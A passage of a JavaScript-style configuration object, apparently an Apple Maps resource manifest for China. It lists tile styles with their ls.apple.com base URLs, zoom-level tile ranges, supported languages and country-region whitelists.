                  maxY: 131976,
                  minY: 82668,
                  maxZ: 18,
                },
              ],
              identifier: 52,
            },
          ],
        },
        {
          scale: 0,
          style: 11,
          checksumType: 0,
          countryRegionWhitelist: [],
          size: 2,
          requestStyle: 1,
          deviceSKUWhitelist: [],
          supportedLanguage: [],
          supportsMultipathTCP: !1,
          baseURL: "https://gspe19-cn-ssl.ls.apple.com/tiles?flags=1",
          validVersion: [
            {
              genericTile: [],
              availableTiles: [
                {
                  maxX: 8191,
                  minZ: 13,
                  minX: 0,
                  maxY: 8191,
                  minY: 0,
                  maxZ: 13,
                },
                {
                  maxX: 16383,
                  minZ: 14,
                  minX: 0,
                  maxY: 16383,
                  minY: 0,
                  maxZ: 14,
                },
                {
                  maxX: 32767,
                  minZ: 15,
                  minX: 0,
                  maxY: 32767,
                  minY: 0,
                  maxZ: 15,
                },
              ],
              identifier: 475,
            },
          ],
        },
        {
          scale: 0,
          style: 12,
          checksumType: 0,
          countryRegionWhitelist: [],
          size: 2,
          requestStyle: 0,
          deviceSKUWhitelist: [],
          supportedLanguage: [],
          supportsMultipathTCP: !1,
          baseURL: "https://gspe12-cn-ssl.ls.apple.com/traffic",
          validVersion: [
            {
              availableTiles: [
                { maxX: 255, minZ: 8, minX: 0, maxY: 255, minY: 0, maxZ: 8 },
                {
                  maxX: 4095,
                  minZ: 12,
                  minX: 0,
                  maxY: 4095,
                  minY: 0,
                  maxZ: 12,
                },
              ],
              identifier: 2181,
              timeToLiveSeconds: 120,
              genericTile: [],
            },
          ],
        },
        {
          scale: 0,
          style: 13,
          checksumType: 0,
          countryRegionWhitelist: [],
          size: 2,
          requestStyle: 1,
          deviceSKUWhitelist: [],
          supportedLanguage: [
            {
              language: [
                "ar",
                "ca",
                "cs",
                "da",
                "de",
                "el",
                "en",
                "en-AU",
                "en-GB",
                "es",
                "es-MX",
                "fi",
                "fr",
                "fr-CA",
                "he",
                "hi",
                "hr",
                "hu",
                "id",
                "it",
                "ja",
                "ko",
                "ms",
                "nb",
                "nl",
                "pl",
                "pt",
                "pt-PT",
                "ro",
                "ru",
                "sk",
                "sv",
                "th",
                "tr",
                "uk",
                "vi",
                "zh-Hans",
                "zh-Hant",
                "zh-HK",
              ],
              identifier: 1,
            },
          ],
          supportsMultipathTCP: !1,
          baseURL: "https://gspe19-cn-ssl.ls.apple.com/tiles?flags=2",
          validVersion: [
            {
              supportedLanguagesVersion: 1,
              availableTiles: [
                { maxX: 1, minZ: 1, minX: 0, maxY: 1, minY: 0, maxZ: 2 },
                { maxX: 15, minZ: 4, minX: 0, maxY: 15, minY: 0, maxZ: 4 },
                { maxX: 63, minZ: 6, minX: 0, maxY: 63, minY: 0, maxZ: 10 },
                {
                  maxX: 4095,
                  minZ: 12,
                  minX: 0,
                  maxY: 4095,
                  minY: 0,
                  maxZ: 15,
                },
                {
                  maxX: 65535,
                  minZ: 16,
                  minX: 0,
                  maxY: 65535,
                  minY: 0,
                  maxZ: 16,
                },
                {
                  maxX: 131071,
                  minZ: 17,
                  minX: 0,
                  maxY: 131071,
                  minY: 0,
                  maxZ: 17,
                },
              ],
              identifier: 2162,
              timeToLiveSeconds: 604800,
              genericTile: [],
            },
          ],
        },
        {
          scale: 0,
          style: 18,
          checksumType: 0,
          countryRegionWhitelist: [],
          size: 2,
          requestStyle: 1,
          deviceSKUWhitelist: [],
          supportedLanguage: [
            {
              language: [
                "ar",
                "ca",
                "cs",
                "da",
                "de",
                "el",
                "en",
                "en-AU",
                "en-GB",
                "es",
                "es-MX",
                "fi",
                "fr",
                "fr-CA",
                "he",
                "hi",
                "hr",
                "hu",
                "id",
                "it",
                "ja",
                "ko",
                "ms",
                "nb",
                "nl",
                "pl",
                "pt",
                "pt-PT",
                "ro",
                "ru",
                "sk",
                "sv",
                "th",
                "tr",
                "uk",
                "vi",
                "zh-Hans",
                "zh-Hant",
                "zh-HK",
              ],
              identifier: 1,
            },
          ],
          supportsMultipathTCP: !1,
          baseURL: "https://gspe19-cn-ssl.ls.apple.com/tiles",
          validVersion: [
            {
              supportedLanguagesVersion: 1,
              availableTiles: [
                {
                  maxX: 32767,
                  minZ: 15,
                  minX: 0,
                  maxY: 32767,
                  minY: 0,
                  maxZ: 15,
                },
              ],
              identifier: 2182,
              genericTile: [],
            },
          ],
        },
        {
          scale: 0,
          style: 20,
          checksumType: 0,
          countryRegionWhitelist: [
            { countryCode: "AE", region: "AE" },
            { countryCode: "AE", region: "SA" },
            { countryCode: "IN", region: "IN" },
            { countryCode: "JP", region: "JP" },
            { countryCode: "KR", region: "KR" },
            { countryCode: "MA", region: "MA" },
            { countryCode: "RU", region: "RU" },
            { countryCode: "SA", region: "AE" },
            { countryCode: "SA", region: "SA" },
          ],
          size: 2,
          requestStyle: 1,
          deviceSKUWhitelist: [],
          supportedLanguage: [
            {
              language: [
                "ar",
                "ca",
                "cs",
                "da",
                "de",
                "el",
                "en",
                "en-AU",
                "en-GB",
                "es",
                "es-MX",
                "fi",
                "fr",
                "fr-CA",
                "he",
                "hi",
                "hr",
                "hu",
                "id",
                "it",
                "ja",
                "ko",
                "ms",
                "nb",
                "nl",
                "pl",
                "pt",
                "pt-PT",
                "ro",
                "ru",
                "sk",
                "sv",
                "th",
                "tr",
                "uk",
                "vi",
                "zh-Hans",
                "zh-Hant",
                "zh-HK",
              ],
              identifier: 1,
            },
          ],
          supportsMultipathTCP: !1,
          baseURL: "https://gspe19-cn-ssl.ls.apple.com/tiles",
          validVersion: [
            {
              supportedLanguagesVersion: 1,
              availableTiles: [
                { maxX: 1, minZ: 1, minX: 0, maxY: 1, minY: 0, maxZ: 1 },
                { maxX: 3, minZ: 2, minX: 0, maxY: 3, minY: 0, maxZ: 2 },
                { maxX: 7, minZ: 3, minX: 0, maxY: 7, minY: 0, maxZ: 3 },
                { maxX: 15, minZ: 4, minX: 0, maxY: 15, minY: 0, maxZ: 4 },
                { maxX: 31, minZ: 5, minX: 0, maxY: 31, minY: 0, maxZ: 5 },
                { maxX: 63, minZ: 6, minX: 0, maxY: 63, minY: 0, maxZ: 6 },
                { maxX: 127, minZ: 7, minX: 0, maxY: 127, minY: 0, maxZ: 7 },
                { maxX: 255, minZ: 8, minX: 0, maxY: 255, minY: 0, maxZ: 8 },
                { maxX: 511, minZ: 9, minX: 0, maxY: 511, minY: 0, maxZ: 9 },
                {
                  maxX: 1023,
                  minZ: 10,
                  minX: 0,
                  maxY: 1023,
                  minY: 0,
                  maxZ: 10,
                },
                {
                  maxX: 2047,
                  minZ: 11,
                  minX: 0,
                  maxY: 2047,
                  minY: 0,
                  maxZ: 11,
                },
                {
                  maxX: 4095,
                  minZ: 12,
                  minX: 0,
                  maxY: 4095,
                  minY: 0,
                  maxZ: 12,
                },
                {
                  maxX: 8191,
                  minZ: 13,
                  minX: 0,
                  maxY: 8191,
                  minY: 0,
                  maxZ: 13,
                },
                {
                  maxX: 16383,
                  minZ: 14,
                  minX: 0,
                  maxY: 16383,
                  minY: 0,
                  maxZ: 14,
                },
                {
                  maxX: 32767,
                  minZ: 15,
                  minX: 0,
                  maxY: 32767,
                  minY: 0,
                  maxZ: 15,
                },
              ],
              identifier: 2182,
              genericTile: [],
            },
          ],
        },
        {
          scale: 0,
          style: 22,
          checksumType: 0,
          countryRegionWhitelist: [],
          size: 2,
          requestStyle: 1,
          deviceSKUWhitelist: [],
          supportedLanguage: [],
          supportsMultipathTCP: !1,
          baseURL: "https://gspe19-cn-ssl.ls.apple.com/tiles",
          validVersion: [
            {
              genericTile: [],
              availableTiles: [
                { maxX: 127, minZ: 7, minX: 0, maxY: 127, minY: 0, maxZ: 15 },
              ],
              identifier: 2182,
            },
          ],
        },
        {
          scale: 0,
          style: 30,
          checksumType: 0,
          countryRegionWhitelist: [],
          size: 2,
          requestStyle: 1,
          deviceSKUWhitelist: [],
          supportedLanguage: [
            {
              language: [
                "ar",
                "ca",
                "cs",
                "da",
                "de",
                "el",
                "en",
                "en-AU",
                "en-GB",
                "es",
                "es-MX",
                "fi",
                "fr",
                "fr-CA",
                "he",
                "hi",
                "hr",
                "hu",
                "id",
                "it",
                "ja",
                "ko",
                "ms",
                "nb",
                "nl",
                "pl",
                "pt",
                "pt-PT",
                "ro",
                "ru",
                "sk",
                "sv",
                "th",
                "tr",
                "uk",
                "vi",
                "zh-Hans",
                "zh-Hant",
                "zh-HK",
              ],
              identifier: 1,
            },
          ],
          supportsMultipathTCP: !1,
          baseURL: "https://gspe19-cn-ssl.ls.apple.com/tiles",
          validVersion: [
            {
              supportedLanguagesVersion: 1,
              availableTiles: [
                {
                  maxX: 1023,
                  minZ: 10,
                  minX: 0,
                  maxY: 1023,
                  minY: 0,
                  maxZ: 10,
                },
                {
                  maxX: 32767,
                  minZ: 15,
                  minX: 0,
                  maxY: 32767,
                  minY: 0,
                  maxZ: 15,
                },
                {
                  maxX: 262143,
                  minZ: 18,
                  minX: 0,
                  maxY: 262143,
                  minY: 0,
                  maxZ: 18,
                },
              ],
              identifier: 151,
              genericTile: [],
            },
          ],
        },
        {
          scale: 0,
          style: 37,
          checksumType: 0,
          countryRegionWhitelist: [],
          size: 2,
          requestStyle: 1,
          deviceSKUWhitelist: [],
          supportedLanguage: [
            {
              language: [
                "ar",
                "ca",
                "cs",
                "da",
                "de",
                "el",
                "en",
                "en-AU",
                "en-GB",
                "es",
                "es-MX",
                "fi",
                "fr",
                "fr-CA",
                "he",
                "hi",
                "hr",
                "hu",
                "id",
                "it",
                "ja",
                "ko",
                "ms",
                "nb",
                "nl",
                "pl",
                "pt",
                "pt-PT",
                "ro",
                "ru",
                "sk",
                "sv",
                "th",
                "tr",
                "uk",
                "vi",
                "zh-Hans",
                "zh-Hant",
                "zh-HK",
              ],
              identifier: 1,
            },
          ],
          supportsMultipathTCP: !1,
          baseURL: "https://gspe19-cn-ssl.ls.apple.com/tiles?flags=2",
          validVersion: [
            {
              supportedLanguagesVersion: 1,
              availableTiles: [
                { maxX: 1, minZ: 1, minX: 0, maxY: 1, minY: 0, maxZ: 1 },
                { maxX: 7, minZ: 3, minX: 0, maxY: 7, minY: 0, maxZ: 3 },
                { maxX: 31, minZ: 5, minX: 0, maxY: 31, minY: 0, maxZ: 5 },
                { maxX: 127, minZ: 7, minX: 0, maxY: 127, minY: 0, maxZ: 7 },
                { maxX: 511, minZ: 9, minX: 0, maxY: 511, minY: 0, maxZ: 9 },
                {
                  maxX: 1023,
                  minZ: 10,
                  minX: 0,
                  maxY: 1023,
                  minY: 0,
                  maxZ: 10,
                },
                {
                  maxX: 2047,
                  minZ: 11,
                  minX: 0,
                  maxY: 2047,
                  minY: 0,
                  maxZ: 11,
                },
                {
                  maxX: 8191,
                  minZ: 13,
                  minX: 0,
                  maxY: 8191,
                  minY: 0,
                  maxZ: 13,
                },
                {
                  maxX: 16383,
                  minZ: 14,
                  minX: 0,
                  maxY: 16383,
                  minY: 0,
                  maxZ: 14,
                },
                {
                  maxX: 32767,
                  minZ: 15,
                  minX: 0,
                  maxY: 32767,
                  minY: 0,
                  maxZ: 15,
                },
              ],
              identifier: 1968,
              genericTile: [],
            },
          ],
        },
        {
          scale: 0,
          style: 47,
          checksumType: 0,
          countryRegionWhitelist: [],
          size: 2,
          requestStyle: 1,
          deviceSKUWhitelist: [],
          supportedLanguage: [
            {
              language: [
                "ar",
                "ca",
                "cs",
                "da",
                "de",
                "el",
                "en",
                "en-AU",
                "en-GB",
                "es",
                "es-MX",
                "fi",
                "fr",
                "fr-CA",
                "he",
                "hi",
                "hr",
                "hu",
                "id",
                "it",
                "ja",
                "ko",
                "ms",
                "nb",
                "nl",
                "pl",
                "pt",
                "pt-PT",
                "ro",
                "ru",
                "sk",
                "sv",
                "th",
                "tr",
                "uk",
                "vi",
                "zh-Hans",
                "zh-Hant",
                "zh-HK",
              ],
              identifier: 1,
            },
          ],
          supportsMultipathTCP: !1,
          baseURL: "https://gspe19-cn-ssl.ls.apple.com/tiles",
          validVersion: [
            {
              supportedLanguagesVersion: 1,
              availableTiles: [
                { maxX: 1, minZ: 1, minX: 0, maxY: 1, minY: 0, maxZ: 1 },
                { maxX: 7, minZ: 3, minX: 0, maxY: 7, minY: 0, maxZ: 3 },
                { maxX: 31, minZ: 5, minX: 0, maxY: 31, minY: 0, maxZ: 5 },
                { maxX: 127, minZ: 7, minX: 0, maxY: 127, minY: 0, maxZ: 7 },
                { maxX: 511, minZ: 9, minX: 0, maxY: 511, minY: 0, maxZ: 9 },
                {
                  maxX: 1023,
                  minZ: 10,
                  minX: 0,
                  maxY: 1023,
                  minY: 0,
                  maxZ: 10,
                },
                {
                  maxX: 2047,
                  minZ: 11,
                  minX: 0,
                  maxY: 2047,
                  minY: 0,
                  maxZ: 11,
                },
                {
                  maxX: 8191,
                  minZ: 13,
                  minX: 0,
                  maxY: 8191,
                  minY: 0,
                  maxZ: 13,
                },
                {
                  maxX: 16383,
                  minZ: 14,
                  minX: 0,
                  maxY: 16383,
                  minY: 0,
                  maxZ: 14,
                },
                {
                  maxX: 32767,
                  minZ: 15,
                  minX: 0,
                  maxY: 32767,
                  minY: 0,
                  maxZ: 15,
                },
              ],
              identifier: 1968,
              genericTile: [],
            },
          ],
        },
        {
          scale: 0,
          style: 48,
          checksumType: 0,
          countryRegionWhitelist: [],
          size: 2,
          requestStyle: 1,
          deviceSKUWhitelist: [],
          supportedLanguage: [],
          supportsMultipathTCP: !1,
          baseURL: "https://gspe19-cn-ssl.ls.apple.com/tiles",
          validVersion: [
            {
              genericTile: [],
              availableTiles: [
                {
                  maxX: 4095,
                  minZ: 12,
                  minX: 0,
                  maxY: 4095,
                  minY: 0,
                  maxZ: 12,
                },
                {
                  maxX: 32767,
                  minZ: 15,
                  minX: 0,
                  maxY: 32767,
                  minY: 0,
                  maxZ: 15,
                },
              ],
              identifier: 1968,
            },
          ],
        },
        {
          scale: 0,
          style: 53,
          checksumType: 0,
          countryRegionWhitelist: [],
          size: 2,
          requestStyle: 1,
          deviceSKUWhitelist: [],
          supportedLanguage: [
            {
              language: [
                "ar",
                "ca",
                "cs",
                "da",
                "de",
                "el",
                "en",
                "en-AU",
                "en-GB",
                "es",
                "es-MX",
                "fi",
                "fr",
                "fr-CA",
                "he",
                "hi",
                "hr",
                "hu",
                "id",
                "it",
                "ja",
                "ko",
                "ms",
                "nb",
                "nl",
                "pl",
                "pt",
                "pt-PT",
                "ro",
                "ru",
                "sk",
                "sv",
                "th",
                "tr",
                "uk",
                "vi",
                "zh-Hans",
                "zh-Hant",
                "zh-HK",
              ],
              identifier: 1,
            },
          ],
          supportsMultipathTCP: !1,
          baseURL: "https://gspe19-cn-ssl.ls.apple.com/tiles",
          validVersion: [
            {
              supportedLanguagesVersion: 1,
              availableTiles: [
                {
                  maxX: 32767,
                  minZ: 15,
                  minX: 0,
                  maxY: 32767,
                  minY: 0,
                  maxZ: 15,
                },
              ],
              identifier: 2182,
              genericTile: [],
            },
          ],
        },
        {
          scale: 0,
          style: 54,
          checksumType: 0,
          countryRegionWhitelist: [],
          size: 2,
          requestStyle: 1,
          deviceSKUWhitelist: [],
          supportedLanguage: [],
          supportsMultipathTCP: !1,
          baseURL: "https://gspe19-cn-ssl.ls.apple.com/tiles",
          validVersion: [
            {
              genericTile: [],
              availableTiles: [
                {
                  maxX: 8191,
                  minZ: 13,
                  minX: 0,
                  maxY: 8191,
                  minY: 0,
                  maxZ: 13,
                },
                {
                  maxX: 32767,
                  minZ: 15,
                  minX: 0,
                  maxY: 32767,
                  minY: 0,
                  maxZ: 15,
                },
              ],
              identifier: 2182,
            },
          ],
        },
        {
          scale: 0,
          style: 56,
          checksumType: 0,
          countryRegionWhitelist: [],
          size: 2,
          requestStyle: 0,
          deviceSKUWhitelist: [],
          supportedLanguage: [
            {
              language: [
                "ar",
                "ca",
                "cs",
                "da",
                "de",
                "el",
                "en",
                "en-AU",
                "en-GB",
                "es",
                "es-MX",
                "fi",
                "fr",
                "fr-CA",
                "he",
                "hi",
                "hr",
                "hu",
                "id",
                "it",
                "ja",
                "ko",
                "ms",
                "nb",
                "nl",
                "pl",
                "pt",
                "pt-PT",
                "ro",
                "ru",
                "sk",
                "sv",
                "th",
                "tr",
                "uk",
                "vi",
                "zh-Hans",
                "zh-Hant",
                "zh-HK",
              ],
              identifier: 1,
            },
          ],
          supportsMultipathTCP: !1,
          baseURL: "https://gspe19-cn-ssl.ls.apple.com/tiles",
          validVersion: [
            {
              supportedLanguagesVersion: 1,
              availableTiles: [
                {
                  maxX: 131071,
                  minZ: 17,
                  minX: 0,
                  maxY: 131071,
                  minY: 0,
                  maxZ: 17,
                },
              ],
              identifier: 16,
              genericTile: [],
            },
          ],
        },
        {
          scale: 0,
          style: 57,
          checksumType: 0,
          countryRegionWhitelist: [],
          size: 2,
          requestStyle: 1,
          deviceSKUWhitelist: [],
          supportedLanguage: [],
          supportsMultipathTCP: !1,
          baseURL: "https://gsp76-cn-ssl.ls.apple.com/api/tile",
          validVersion: [
            {
              availableTiles: [
                {
                  maxX: 131071,
                  minZ: 17,
                  minX: 0,
                  maxY: 131071,
                  minY: 0,
                  maxZ: 17,
                },
              ],
              identifier: 0,
              timeToLiveSeconds: 3600,
              genericTile: [],
            },
          ],
        },
        {
          scale: 0,
          style: 58,
          checksumType: 0,
          countryRegionWhitelist: [],
          size: 2,
          requestStyle: 0,
          deviceSKUWhitelist: [],
          supportedLanguage: [],
          supportsMultipathTCP: !1,
          baseURL: "https://gspe19-cn-ssl.ls.apple.com/tiles",
          validVersion: [
            {
              genericTile: [],
              availableTiles: [
                { maxX: 1, minZ: 1, minX: 0, maxY: 1, minY: 0, maxZ: 1 },
                { maxX: 3, minZ: 2, minX: 0, maxY: 3, minY: 0, maxZ: 2 },
                { maxX: 7, minZ: 3, minX: 0, maxY: 7, minY: 0, maxZ: 3 },
                { maxX: 15, minZ: 4, minX: 0, maxY: 15, minY: 0, maxZ: 4 },
                { maxX: 31, minZ: 5, minX: 0, maxY: 31, minY: 0, maxZ: 5 },
                { maxX: 63, minZ: 6, minX: 0, maxY: 63, minY: 0, maxZ: 6 },
                { maxX: 127, minZ: 7, minX: 0, maxY: 127, minY: 0, maxZ: 7 },
                { maxX: 255, minZ: 8, minX: 0, maxY: 255, minY: 0, maxZ: 8 },
                { maxX: 511, minZ: 9, minX: 0, maxY: 511, minY: 0, maxZ: 9 },
                {
                  maxX: 1023,
                  minZ: 10,
                  minX: 0,
                  maxY: 1023,
                  minY: 0,
                  maxZ: 10,
                },
                {
                  maxX: 2047,
                  minZ: 11,
                  minX: 0,
                  maxY: 2047,
                  minY: 0,
                  maxZ: 11,
                },
                {
                  maxX: 4095,
                  minZ: 12,
                  minX: 0,
                  maxY: 4095,
                  minY: 0,
                  maxZ: 12,
                },
                {
                  maxX: 8191,
                  minZ: 13,
                  minX: 0,
                  maxY: 8191,
                  minY: 0,
                  maxZ: 13,
                },
                {
                  maxX: 16383,
                  minZ: 14,
                  minX: 0,
                  maxY: 16383,
                  minY: 0,
                  maxZ: 14,
                },
                {
                  maxX: 32767,
                  minZ: 15,
                  minX: 0,
                  maxY: 32767,
                  minY: 0,
                  maxZ: 15,
                },
                {
                  maxX: 65535,
                  minZ: 16,
                  minX: 0,
                  maxY: 65535,
                  minY: 0,
                  maxZ: 16,
                },
                {
                  maxX: 131071,
                  minZ: 17,
                  minX: 0,
                  maxY: 131071,
                  minY: 0,
                  maxZ: 17,
                },
              ],
              identifier: 147,
            },
          ],
        },
        {
          scale: 0,
          style: 59,
          checksumType: 0,
          countryRegionWhitelist: [],
          size: 2,
          requestStyle: 0,
          deviceSKUWhitelist: [],
          supportedLanguage: [],
          supportsMultipathTCP: !1,
          baseURL: "https://gspe19-cn-ssl.ls.apple.com/asset/v3/model",
          validVersion: [
            {
              genericTile: [],
              availableTiles: [
                { maxX: 1, minZ: 1, minX: 0, maxY: 1, minY: 0, maxZ: 1 },
              ],
              identifier: 85,
            },
          ],
        },
        {
          scale: 0,
          style: 60,
          checksumType: 0,
          countryRegionWhitelist: [],
          size: 2,
          requestStyle: 0,
          deviceSKUWhitelist: [],
          supportedLanguage: [],
          supportsMultipathTCP: !1,
          baseURL: "https://gspe19-cn-ssl.ls.apple.com/asset/v3/material",
          validVersion: [
            {
              genericTile: [],
              availableTiles: [
                { maxX: 1, minZ: 1, minX: 0, maxY: 1, minY: 0, maxZ: 1 },
                { maxX: 3, minZ: 2, minX: 0, maxY: 3, minY: 0, maxZ: 2 },
                { maxX: 7, minZ: 3, minX: 0, maxY: 7, minY: 0, maxZ: 3 },
                { maxX: 15, minZ: 4, minX: 0, maxY: 15, minY: 0, maxZ: 4 },
                { maxX: 31, minZ: 5, minX: 0, maxY: 31, minY: 0, maxZ: 5 },
                { maxX: 63, minZ: 6, minX: 0, maxY: 63, minY: 0, maxZ: 6 },
                { maxX: 127, minZ: 7, minX: 0, maxY: 127, minY: 0, maxZ: 7 },
                { maxX: 255, minZ: 8, minX: 0, maxY: 255, minY: 0, maxZ: 8 },
                { maxX: 511, minZ: 9, minX: 0, maxY: 511, minY: 0, maxZ: 9 },
              ],
              identifier: 30,
            },
          ],
        },
        {
          scale: 0,
          style: 61,
          checksumType: 0,
          countryRegionWhitelist: [],
          size: 2,
          requestStyle: 0,
          deviceSKUWhitelist: [],
          supportedLanguage: [],
          supportsMultipathTCP: !1,
          baseURL: "https://gspe19-cn-ssl.ls.apple.com/tiles",
          validVersion: [
            {
              genericTile: [],
              availableTiles: [
                { maxX: 127, minZ: 7, minX: 0, maxY: 127, minY: 0, maxZ: 7 },
              ],
              identifier: 30,
            },
          ],
        },
        {
          scale: 0,
          style: 64,
          checksumType: 0,
          countryRegionWhitelist: [],
          size: 2,
          requestStyle: 0,
          deviceSKUWhitelist: [],
          supportedLanguage: [
            {
              language: [
                "ar",
                "ca",
                "cs",
                "da",
                "de",
                "el",
                "en",
                "en-AU",
                "en-GB",
                "es",
                "es-MX",
                "fi",
                "fr",
                "fr-CA",
                "he",
                "hi",
                "hr",
                "hu",
                "id",
                "it",
                "ja",
                "ko",
                "ms",
                "nb",
                "nl",
                "pl",
                "pt",
                "pt-PT",
                "ro",
                "ru",
                "sk",
                "sv",
                "th",
                "tr",
                "uk",
                "vi",
                "zh-Hans",
                "zh-Hant",
                "zh-HK",
              ],
              identifier: 1,
            },
          ],
          supportsMultipathTCP: !1,
          baseURL: "https://gspe19-cn-ssl.ls.apple.com/tiles",
          validVersion: [
            {
              supportedLanguagesVersion: 1,
              availableTiles: [
                {
                  maxX: 4095,
                  minZ: 12,
                  minX: 0,
                  maxY: 4095,
                  minY: 0,
                  maxZ: 12,
                },
              ],
              identifier: 16,
              genericTile: [],
            },
          ],
        },
        {
          scale: 0,
          style: 65,
          checksumType: 0,
          countryRegionWhitelist: [],
          size: 2,
          requestStyle: 1,
          deviceSKUWhitelist: [],
          supportedLanguage: [],
          supportsMultipathTCP: !1,
          baseURL: "https://gspe79-cn-ssl.ls.apple.com/65/v1",
          validVersion: [
            {
              availableTiles: [
                { maxX: 255, minZ: 8, minX: 0, maxY: 255, minY: 0, maxZ: 8 },
              ],
              identifier: 2,
              timeToLiveSeconds: 3600,
              genericTile: [],
            },
          ],
        },
        {
          scale: 0,
          style: 66,
          checksumType: 0,
          countryRegionWhitelist: [
            { countryCode: "AE", region: "AE" },
            { countryCode: "AE", region: "SA" },
            { countryCode: "IN", region: "IN" },
            { countryCode: "JP", region: "JP" },
            { countryCode: "KR", region: "KR" },
            { countryCode: "MA", region: "MA" },
            { countryCode: "RU", region: "RU" },
            { countryCode: "SA", region: "AE" },
            { countryCode: "SA", region: "SA" },
          ],
          size: 2,
          requestStyle: 0,
          deviceSKUWhitelist: [],
          supportedLanguage: [
            {
              language: [
                "ar",
                "ca",
                "cs",
                "da",
                "de",
                "el",
                "en",
                "en-AU",
                "en-GB",
                "es",
                "es-MX",
                "fi",
                "fr",
                "fr-CA",
                "he",
                "hi",
                "hr",
                "hu",
                "id",
                "it",
                "ja",
                "ko",
                "ms",
                "nb",
                "nl",
                "pl",
                "pt",
                "pt-PT",
                "ro",
                "ru",
                "sk",
                "sv",
                "th",
                "tr",
                "uk",
                "vi",
                "zh-Hans",
                "zh-Hant",
                "zh-HK",
              ],
              identifier: 1,
            },
          ],
          supportsMultipathTCP: !1,
          baseURL: "https://gspe19-cn-ssl.ls.apple.com/tiles",
          validVersion: [
            {
              supportedLanguagesVersion: 1,
              availableTiles: [
                { maxX: 1, minZ: 1, minX: 0, maxY: 1, minY: 0, maxZ: 1 },
                { maxX: 3, minZ: 2, minX: 0, maxY: 3, minY: 0, maxZ: 2 },
                { maxX: 7, minZ: 3, minX: 0, maxY: 7, minY: 0, maxZ: 3 },
                { maxX: 15, minZ: 4, minX: 0, maxY: 15, minY: 0, maxZ: 4 },
                { maxX: 31, minZ: 5, minX: 0, maxY: 31, minY: 0, maxZ: 5 },
                { maxX: 63, minZ: 6, minX: 0, maxY: 63, minY: 0, maxZ: 6 },
                { maxX: 127, minZ: 7, minX: 0, maxY: 127, minY: 0, maxZ: 7 },
                { maxX: 255, minZ: 8, minX: 0, maxY: 255, minY: 0, maxZ: 8 },
                { maxX: 511, minZ: 9, minX: 0, maxY: 511, minY: 0, maxZ: 9 },
                {
                  maxX: 1023,
                  minZ: 10,
                  minX: 0,
                  maxY: 1023,
                  minY: 0,
                  maxZ: 10,
                },
                {
                  maxX: 2047,
                  minZ: 11,
                  minX: 0,
                  maxY: 2047,
                  minY: 0,
                  maxZ: 11,
                },
                {
                  maxX: 4095,
                  minZ: 12,
                  minX: 0,
                  maxY: 4095,
                  minY: 0,
                  maxZ: 12,
                },
                {
                  maxX: 8191,
                  minZ: 13,
                  minX: 0,
                  maxY: 8191,
                  minY: 0,
                  maxZ: 13,
                },
                {
                  maxX: 16383,
                  minZ: 14,
                  minX: 0,
                  maxY: 16383,
                  minY: 0,
                  maxZ: 14,
                },
                {
                  maxX: 32767,
                  minZ: 15,
                  minX: 0,
                  maxY: 32767,
                  minY: 0,
                  maxZ: 15,
                },
              ],
              identifier: 2182,
              genericTile: [],
            },
          ],
        },
        {
          scale: 0,
          style: 67,
          checksumType: 0,
          countryRegionWhitelist: [
            { countryCode: "AE", region: "AE" },
            { countryCode: "AE", region: "SA" },
            { countryCode: "IN", region: "IN" },
            { countryCode: "JP", region: "JP" },
            { countryCode: "KR", region: "KR" },
            { countryCode: "MA", region: "MA" },
            { countryCode: "RU", region: "RU" },
            { countryCode: "SA", region: "AE" },
            { countryCode: "SA", region: "SA" },
          ],
          size: 2,
          requestStyle: 0,
          deviceSKUWhitelist: [],
          supportedLanguage: [
            {
              language: [
                "ar",
                "ca",
                "cs",
                "da",
                "de",
                "el",
                "en",
                "en-AU",
                "en-GB",
                "es",
                "es-MX",
                "fi",
                "fr",
                "fr-CA",
                "he",
                "hi",
                "hr",
                "hu",
                "id",
                "it",
                "ja",
                "ko",
                "ms",
                "nb",
                "nl",
                "pl",
                "pt",
                "pt-PT",
                "ro",
                "ru",
                "sk",
                "sv",
                "th",
                "tr",
                "uk",
                "vi",
                "zh-Hans",
                "zh-Hant",
                "zh-HK",
              ],
              identifier: 1,
            },
          ],
          supportsMultipathTCP: !1,
          baseURL: "https://gspe19-cn-ssl.ls.apple.com/tiles",
          validVersion: [
            {
              supportedLanguagesVersion: 1,
              availableTiles: [
                { maxX: 1, minZ: 1, minX: 0, maxY: 1, minY: 0, maxZ: 1 },
                { maxX: 3, minZ: 2, minX: 0, maxY: 3, minY: 0, maxZ: 2 },
                { maxX: 7, minZ: 3, minX: 0, maxY: 7, minY: 0, maxZ: 3 },
                { maxX: 15, minZ: 4, minX: 0, maxY: 15, minY: 0, maxZ: 4 },
                { maxX: 31, minZ: 5, minX: 0, maxY: 31, minY: 0, maxZ: 5 },
                { maxX: 63, minZ: 6, minX: 0, maxY: 63, minY: 0, maxZ: 6 },
                { maxX: 127, minZ: 7, minX: 0, maxY: 127, minY: 0, maxZ: 7 },
                { maxX: 255, minZ: 8, minX: 0, maxY: 255, minY: 0, maxZ: 8 },
                {
                  maxX: 1023,
                  minZ: 10,
                  minX: 0,
                  maxY: 1023,
                  minY: 0,
                  maxZ: 10,
                },
                {
                  maxX: 4095,
                  minZ: 12,
                  minX: 0,
                  maxY: 4095,
                  minY: 0,
                  maxZ: 12,
                },
                {
                  maxX: 16383,
                  minZ: 14,
                  minX: 0,
                  maxY: 16383,
                  minY: 0,
                  maxZ: 14,
                },
              ],
              identifier: 2182,
              genericTile: [],
            },
          ],
        },
        {
          scale: 0,
          style: 68,
          checksumType: 0,
          countryRegionWhitelist: [],
          size: 2,
          requestStyle: 0,
          deviceSKUWhitelist: [],
          supportedLanguage: [
            {
              language: [
                "ar",
                "ca",
                "cs",
                "da",
                "de",
                "el",
                "en",
                "en-AU",
                "en-GB",
                "es",
                "es-MX",
                "fi",
                "fr",
                "fr-CA",
                "he",
                "hi",
                "hr",
                "hu",
                "id",
                "it",
                "ja",
                "ko",
                "ms",
                "nb",
                "nl",
                "pl",
                "pt",
                "pt-PT",
                "ro",
                "ru",
                "sk",
                "sv",
                "th",
                "tr",
                "uk",
                "vi",
                "zh-Hans",
                "zh-Hant",
                "zh-HK",
              ],
              identifier: 1,
            },
          ],
          supportsMultipathTCP: !1,
          baseURL: "https://gspe19-cn-ssl.ls.apple.com/tiles",
          validVersion: [
            {
              supportedLanguagesVersion: 1,
              availableTiles: [
                { maxX: 1, minZ: 1, minX: 0, maxY: 1, minY: 0, maxZ: 1 },
                { maxX: 3, minZ: 2, minX: 0, maxY: 3, minY: 0, maxZ: 2 },
                { maxX: 15, minZ: 4, minX: 0, maxY: 15, minY: 0, maxZ: 4 },
